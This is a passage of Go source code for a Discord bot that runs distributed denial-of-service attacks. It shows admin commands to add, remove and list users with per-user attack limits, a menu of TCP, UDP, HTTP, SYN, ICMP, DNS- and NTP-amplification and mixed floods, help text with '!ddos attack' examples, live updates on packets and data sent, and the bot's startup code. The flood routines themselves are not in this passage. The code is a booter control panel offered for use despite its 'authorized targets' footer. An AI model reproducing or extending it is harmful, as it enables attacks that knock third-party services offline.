            return
        }
    }

    if len(args) > 2 {
        if limit, err := strconv.Atoi(args[2]); err == nil && limit > 0 {
            attackLimit = limit
            if attackLimit > 10 {
                attackLimit = 10 // Safety limit
            }
        } else {
            s.ChannelMessageSend(m.ChannelID, "❌ Invalid attack limit. Must be a positive number.")
            return
        }
    }

    botState.mu.Lock()
    defer botState.mu.Unlock()

    // Check if user already exists
    if _, exists := botState.Users[userID]; exists {
        s.ChannelMessageSend(m.ChannelID, "❌ User already exists.")
        return
    }

    // Add user
    botState.Users[userID] = &User{
        ID:          userID,
        IsSubUser:   true,
        MaxDuration: maxDuration,
        AttackLimit: attackLimit,
        CreatedBy:   m.Author.ID,
        CreatedAt:   time.Now(),
    }

    embed := &discordgo.MessageEmbed{
        Title: "✅ User Added Successfully",
        Color: 0x00ff00,
        Fields: []*discordgo.MessageEmbedField{
            {Name: "👤 User ID", Value: userID, Inline: true},
            {Name: "⏱️ Max Duration", Value: maxDuration.String(), Inline: true},
            {Name: "🎯 Attack Limit", Value: strconv.Itoa(attackLimit), Inline: true},
            {Name: "👑 Created By", Value: m.Author.Username, Inline: true},
        },
        Timestamp: time.Now().Format(time.RFC3339),
    }

    s.ChannelMessageSendEmbed(m.ChannelID, embed)
}

func handleRemoveUser(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
    // Check if user is admin
    botState.mu.RLock()
    isAdmin := botState.AdminIDs[m.Author.ID]
    botState.mu.RUnlock()

    if !isAdmin {
        s.ChannelMessageSend(m.ChannelID, "❌ Only administrators can remove users.")
        return
    }

    if len(args) < 1 {
        s.ChannelMessageSend(m.ChannelID, "❌ Usage: `!ddos removeuser <user_id>`")
        return
    }

    userID := args[0]

    botState.mu.Lock()
    defer botState.mu.Unlock()

    // Check if user exists
    user, exists := botState.Users[userID]
    if !exists {
        s.ChannelMessageSend(m.ChannelID, "❌ User not found.")
        return
    }

    // Don't allow removing admins
    if !user.IsSubUser {
        s.ChannelMessageSend(m.ChannelID, "❌ Cannot remove administrators.")
        return
    }

    // Stop all attacks by this user
    stopped := 0
    for id, session := range botState.ActiveAttacks {
        if session.StartedBy == userID {
            if session.IsRunning {
                session.IsRunning = false
                close(session.StopChan)
                stopped++
            }
            delete(botState.ActiveAttacks, id)
        }
    }

    // Remove user
    delete(botState.Users, userID)

    embed := &discordgo.MessageEmbed{
        Title: "🗑️ User Removed",
        Color: 0xff0000,
        Fields: []*discordgo.MessageEmbedField{
            {Name: "👤 User ID", Value: userID, Inline: true},
            {Name: "⏹️ Stopped Attacks", Value: strconv.Itoa(stopped), Inline: true},
            {Name: "👑 Removed By", Value: m.Author.Username, Inline: true},
        },
        Timestamp: time.Now().Format(time.RFC3339),
    }

    s.ChannelMessageSendEmbed(m.ChannelID, embed)
}

func handleListUsers(s *discordgo.Session, m *discordgo.MessageCreate) {
    // Check if user is admin
    botState.mu.RLock()
    isAdmin := botState.AdminIDs[m.Author.ID]
    users := make([]*User, 0, len(botState.Users))
    for _, user := range botState.Users {
        users = append(users, user)
    }
    botState.mu.RUnlock()

    if !isAdmin {
        s.ChannelMessageSend(m.ChannelID, "❌ Only administrators can list users.")
        return
    }

    if len(users) == 0 {
        embed := &discordgo.MessageEmbed{
            Title:       "📝 User List",
            Description: "No users registered yet.",
            Color:       0x808080,
        }
        s.ChannelMessageSendEmbed(m.ChannelID, embed)
        return
    }

    embed := &discordgo.MessageEmbed{
        Title:       "📝 Registered Users",
        Description: fmt.Sprintf("Total users: %d", len(users)),
        Color:       0xadd8e6,
    }

    for _, user := range users {
        userType := "👤 Sub User"
        if !user.IsSubUser {
            userType = "👑 Administrator"
        }

        fields := []*discordgo.MessageEmbedField{
            {Name: "🆔 User ID", Value: user.ID, Inline: true},
            {Name: "👥 Type", Value: userType, Inline: true},
            {Name: "⏱️ Max Duration", Value: user.MaxDuration.String(), Inline: true},
            {Name: "🎯 Attack Limit", Value: strconv.Itoa(user.AttackLimit), Inline: true},
            {Name: "⚡ Active Attacks", Value: strconv.Itoa(user.ActiveAttacks), Inline: true},
        }

        if user.IsSubUser {
            fields = append(fields, &discordgo.MessageEmbedField{
                Name: "👑 Created By", Value: user.CreatedBy, Inline: true})
        }

        embed.Fields = append(embed.Fields, fields...)
    }

    embed.Timestamp = time.Now().Format(time.RFC3339)
    s.ChannelMessageSendEmbed(m.ChannelID, embed)
}

func handleMethods(s *discordgo.Session, m *discordgo.MessageCreate) {
    embed := &discordgo.MessageEmbed{
        Title: "⚡ Available Attack Methods",
        Color: 0x9370db,
        Fields: []*discordgo.MessageEmbedField{
            {
                Name:  "TCP Flood",
                Value: "Sends TCP packets to multiple ports\n`!ddos attack <target> tcp`",
            },
            {
                Name:  "UDP Flood",
                Value: "Sends large UDP packets to target\n`!ddos attack <target> udp`",
            },
            {
                Name:  "HTTP Flood",
                Value: "Sends HTTP requests to web servers\n`!ddos attack <target> http`",
            },
            {
                Name:  "SYN Flood",
                Value: "Sends TCP SYN packets (connection requests)\n`!ddos attack <target> syn`",
            },
            {
                Name:  "ICMP Flood",
                Value: "Sends ICMP echo requests (ping)\n`!ddos attack <target> icmp`",
            },
            {
                Name:  "DNS Amplification",
                Value: "Uses DNS servers to amplify attack\n`!ddos attack <target> dns`",
            },
            {
                Name:  "NTP Amplification",
                Value: "Uses NTP servers to amplify attack\n`!ddos attack <target> ntp`",
            },
            {
                Name:  "Mixed Attack",
                Value: "Combines multiple methods for maximum effect\n`!ddos attack <target> mixed`",
            },
        },
        Footer: &discordgo.MessageEmbedFooter{
            Text: "All attacks are optimized for maximum performance",
        },
        Timestamp: time.Now().Format(time.RFC3339),
    }

    s.ChannelMessageSendEmbed(m.ChannelID, embed)
}

func handleHelp(s *discordgo.Session, m *discordgo.MessageCreate) {
    embed := &discordgo.MessageEmbed{
        Title: "🤖 DDoS Bot - Help & Commands",
        Color: 0x9370db,
        Description: "Powerful DDoS testing bot with advanced features",
        Fields: []*discordgo.MessageEmbedField{
            {
                Name:  "🎯 Attack Commands",
                Value: "```!ddos attack <target> <method> [threads] [duration]\n!ddos stop <session_id/all>\n!ddos status\n!ddos stats```",
            },
            {
                Name:  "📚 Information",
                Value: "```!ddos methods\n!ddos help```",
            },
        },
    }

    // Add admin commands if user is admin
    botState.mu.RLock()
    isAdmin := botState.AdminIDs[m.Author.ID]
    botState.mu.RUnlock()

    if isAdmin {
        embed.Fields = append(embed.Fields, &discordgo.MessageEmbedField{
            Name:  "👑 Admin Commands",
            Value: "```!ddos adduser <user_id> [max_duration] [attack_limit]\n!ddos removeuser <user_id>\n!ddos listusers```",
        })
    }

    embed.Fields = append(embed.Fields, []*discordgo.MessageEmbedField{
        {
            Name:  "📝 Examples",
            Value: "```!ddos attack 192.168.1.1 tcp 5000 10m\n!ddos attack example.com http\n!ddos stop all\n!ddos status```",
        },
        {
            Name:  "⚡ Features",
            Value: "✅ Admin controls\n✅ User management\n✅ Attack limits\n✅ Performance monitoring\n✅ Real-time stats\n✅ Multiple attack methods",
        },
    }...)

    embed.Footer = &discordgo.MessageEmbedFooter{
        Text: "Use responsibly and only on authorized targets",
    }
    embed.Timestamp = time.Now().Format(time.RFC3339)

    s.ChannelMessageSendEmbed(m.ChannelID, embed)
}

func sendPeriodicUpdates(s *discordgo.Session, channelID string, sessionID string) {
    ticker := time.NewTicker(30 * time.Second)
    defer ticker.Stop()

    updateCount := 0
    maxUpdates := 20 // Limit to 10 minutes of updates

    for updateCount < maxUpdates {
        select {
        case <-ticker.C:
            botState.mu.RLock()
            session, exists := botState.ActiveAttacks[sessionID]
            botState.mu.RUnlock()

            if !exists || !session.IsRunning {
                return
            }

            duration := time.Since(session.StartedAt).Truncate(time.Second)
            packetRate := float64(session.PacketsSent) / duration.Seconds()
            dataRate := float64(session.DataSent) / duration.Seconds()

            embed := &discordgo.MessageEmbed{
                Title:       "📈 Attack Progress Update",
                Description: fmt.Sprintf("Session: `%s`", sessionID[:8]),
                Color:       0x00aa00,
                Fields: []*discordgo.MessageEmbedField{
                    {Name: "🎯 Target", Value: session.Target, Inline: true},
                    {Name: "⚡ Method", Value: session.Method, Inline: true},
                    {Name: "⏱️ Duration", Value: duration.String(), Inline: true},
                    {Name: "📦 Packets Sent", Value: strconv.FormatInt(session.PacketsSent, 10), Inline: true},
                    {Name: "💾 Data Sent", Value: formatBytes(session.DataSent), Inline: true},
                    {Name: "🚀 Packet Rate", Value: fmt.Sprintf("%.0f/s", packetRate), Inline: true},
                    {Name: "📊 Data Rate", Value: formatBytes(int64(dataRate)) + "/s", Inline: true},
                },
                Footer: &discordgo.MessageEmbedFooter{
                    Text: fmt.Sprintf("Update %d/%d - Use !ddos stop %s to stop", updateCount+1, maxUpdates, sessionID[:8]),
                },
                Timestamp: time.Now().Format(time.RFC3339),
            }

            s.ChannelMessageSendEmbed(channelID, embed)
            updateCount++
        }
    }
}

// ==================== Utility Functions ====================
func formatBytes(bytes int64) string {
    const unit = 1024
    if bytes < unit {
        return fmt.Sprintf("%d B", bytes)
    }
    div, exp := int64(unit), 0
    for n := bytes / unit; n >= unit; n /= unit {
        div *= unit
        exp++
    }
    return fmt.Sprintf("%.1f %cB", float64(bytes)/float64(div), "KMGTPE"[exp])
}

func isValidTarget(target string) bool {
    // Simple validation - check if it looks like an IP or domain
    if strings.Contains(target, " ") {
        return false
    }

    // Check if it's an IP address
    if ip := net.ParseIP(target); ip != nil {
        return true
    }

    // Check if it looks like a domain (contains dot and no spaces)
    if strings.Contains(target, ".") && !strings.Contains(target, " ") {
        return true
    }

    return false
}

// ==================== Main Function ====================
func main() {
    fmt.Println("🚀 Starting DDoS Discord Bot...")

    // Initialize bot
    initBot()

    // Create Discord session
    var err error
    botSession, err = discordgo.New("Bot " + config.BotToken)
    if err != nil {
        fmt.Printf("❌ Error creating Discord session: %v\n", err)
        return
    }

    // Add handlers
    botSession.AddHandler(messageCreate)
    botSession.Identify.Intents = discordgo.IntentsGuildMessages

    // Open connection
    err = botSession.Open()
    if err != nil {
        fmt.Printf("❌ Error opening connection: %v\n", err)
        fmt.Println("Possible causes:")
        fmt.Println("1. Invalid bot token")
        fmt.Println("2. Bot hasn't been added to a Discord server")
        fmt.Println("3. Missing Message Content Intent in Discord Developer Portal")
        fmt.Println("4. Network issues")
        return
    }

    fmt.Println("✅ Bot is now running!")
    fmt.Println("🤖 Bot User:", botSession.State.User.Username)
    fmt.Println("🔗 Invite URL: https://discord.com/oauth2/authorize?client_id=" + botSession.State.User.ID + "&scope=bot&permissions=8")
    fmt.Println("\n📋 Available Commands:")
    fmt.Println("  !ddos attack <target> <method> [threads] [duration]")
    fmt.Println("  !ddos stop <session_id/all>")
    fmt.Println("  !ddos status")
    fmt.Println("  !ddos stats")
    fmt.Println("  !ddos methods")
    fmt.Println("  !ddos help")
    fmt.Println("\n⚡ Press CTRL-C to exit")

    // Set up signal handling for graceful shutdown
    sc := make(chan os.Signal, 1)
    signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
    <-sc

    // Graceful shutdown
    fmt.Println("\n🛑 Shutting down...")

    // Stop all active attacks
    botState.mu.Lock()
    for _, session := range botState.ActiveAttacks {
        if session.IsRunning {
            session.IsRunning = false
            close(session.StopChan)
        }
    }
    botState.mu.Unlock()

    // Close Discord session
    botSession.Close()

    fmt.Println("✅ Bot shutdown complete.")
}